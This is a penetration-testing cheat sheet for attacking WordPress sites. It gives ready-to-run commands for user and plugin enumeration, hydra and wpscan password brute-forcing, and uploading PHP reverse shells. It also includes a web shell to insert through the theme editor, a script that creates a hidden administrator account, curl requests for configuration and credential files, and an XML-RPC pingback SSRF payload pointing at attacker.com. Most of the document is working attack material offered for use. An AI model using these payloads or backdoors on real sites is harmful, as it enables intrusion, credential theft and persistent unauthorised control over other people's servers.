# WordPress – Attack Surface & Exploitation

!!! tip "Tip"
    `wpscan --url <target> --enumerate u` to enumerate users first — then target those accounts. Check `/wp-json/wp/v2/users` for unauthenticated user enumeration even if wpscan is blocked.

!!! warning "Watch out"
    wpscan's plugin/theme detection is noisy and slow. Run `--enumerate p` only after confirming the scan won't trip rate limiting or WAF rules.

---
## Enumeration and Recon

### Identify WordPress CMS

Look for:

- `/wp-admin/`, `/wp-login.php`, `/xmlrpc.php`
    
- HTML meta generator tags: `content="WordPress 5.8.1"`
    
- Common file structure: `wp-content/themes`, `wp-includes`
    
### Tools

**WhatWeb**:

```bash
whatweb http://target
```

**Wappalyzer (Browser Plugin)**

**Nmap + NSE**:

```bash
nmap -p 80,443 --script http-wordpress-enum $IP
```

---

## WPScan – WordPress Scanner

**Site**: [https://wpscan.com/](https://wpscan.com/)  
**API**: Requires free registration for vulnerability DB access.

### Install WPScan

```bash
sudo gem install wpscan
```

### Quick Scan

```bash
wpscan --url http://target
```

### Enumerate Plugins & Versions

```bash
wpscan --url http://target -e vp --api-token $TOKEN -o wpscan.log
```

- `-e vp` – Enumerate vulnerable plugins
    
- `-e p` – Enumerate all plugins
    
- `-e u` – Enumerate usernames
    
- `--api-token` – Use your API key for vulnerability DB
    
- `-o` – Output scan to file
    

### Full Enumeration Example

```bash
wpscan --url http://target -e ap,at,cb,dbe,u,m --api-token $TOKEN
```

|Flag|Description|
|---|---|
|`ap`|All Plugins|
|`at`|All Themes|
|`cb`|Config Backup Files (`wp-config.php~`)|
|`dbe`|DB Exports (e.g., `.sql`)|
|`u`|Usernames|
|`m`|Media files|

---
## Exploitation Techniques

### Brute Force Login (XML-RPC or wp-login)

```bash
wpscan --url http://target -U users.txt -P rockyou.txt --api-token $TOKEN
```

Or use:

```bash
hydra -l admin -P rockyou.txt http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:F=incorrect"
```

### Exploiting Vulnerable Plugins

Use:

- WPScan results to identify CVEs
    
- `searchsploit` for local exploit POCs
    
- `exploit-db`, GitHub, or known RCE plugin exploits
    

Example:

```bash
searchsploit wp plugin <plugin-name>
```

### Exploit Upload Functionality

If plugin allows file upload (like `contact-form-7`, `revslider`, etc.):

1. Upload `.php` reverse shell
    
2. Access uploaded shell in browser
    
3. Trigger reverse shell back to listener
    

```bash
nc -lvnp 4444
```

---
## Post-Exploitation & Persistence

### Gain WP Admin Shell via Theme/Plugin Editor

1. Navigate to: `/wp-admin/theme-editor.php`
    
2. Edit `404.php` or `functions.php`:
    

```php
<?php system($_GET['cmd']); ?>
```

3. Browse to:
    

```
http://target/wp-content/themes/<theme>/404.php?cmd=whoami
```

### Create Admin User via Shell

```php
<?php
require('wp-load.php');
$user = 'pentester';
$pass = 'SuperSecure123!';
$email = 'root@localhost';
if (!username_exists($user)) {
  $user_id = wp_create_user($user, $pass, $email);
  $user = new WP_User($user_id);
  $user->set_role('administrator');
}
?>
```

Access via:

```
http://target/wp-content/uploads/admin_create.php
```

---
## Manual Inspection Tips

### Public Disclosure of Sensitive Files

Try:

```bash
curl http://target/.git/config
curl http://target/wp-config.php~
curl http://target/wp-content/debug.log
```

### Common WordPress Files to Check

- `wp-config.php`
    
- `.htaccess`
    
- `.user.ini`
    
- `.env`
    

### XML-RPC Abuse

Used for brute-force and pingback SSRF:

```bash
curl -X POST -d @payload.xml http://target/xmlrpc.php
```

Payload:

```xml
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>http://attacker.com</string></value></param>
    <param><value><string>http://localhost/</string></value></param>
  </params>
</methodCall>
```

---
## Useful Tools

### WPScan

- Comprehensive enumeration and vulnerability identification
    
- Use with `--api-token` for CVE lookup
    

### Metasploit Modules

```bash
search wordpress
```

Examples:

- `exploit/unix/webapp/wp_admin_shell_upload`
    
- `exploit/multi/http/wp_crop_rce`
    

### Burp Suite

- For fuzzing form parameters
    
- Bypassing WAFs or login brute-force throttling
    

### Wordlist Suggestions

- `SecLists/Discovery/Web-Content/CMS/wordpress.txt`
    
- `rockyou.txt` for brute-force
    

---
## References

- [https://wpscan.com](https://wpscan.com/)
    
- [https://github.com/wpscanteam/wpscan](https://github.com/wpscanteam/wpscan)
